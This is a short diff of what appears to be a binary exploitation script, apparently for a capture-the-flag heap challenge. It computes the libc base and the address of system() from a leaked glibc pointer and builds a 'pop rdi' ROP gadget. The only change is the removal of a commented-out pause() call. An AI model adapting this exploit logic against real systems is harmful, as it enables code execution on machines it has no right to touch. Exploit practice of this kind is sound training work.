@@ -114,8 +114,6 @@ malloc("1", str(second_half_srack_addr))
 system_libc_offset = 0x1caa93
 system_addr = glibc_leak - system_libc_offset
 
-# pause()
-
 libc_base = glibc_leak - 0x21b803
 pop_rdi_gadget = libc_base + 0x2a3e5
 pop_rdi_gadget = p64(pop_rdi_gadget, endianness="little")
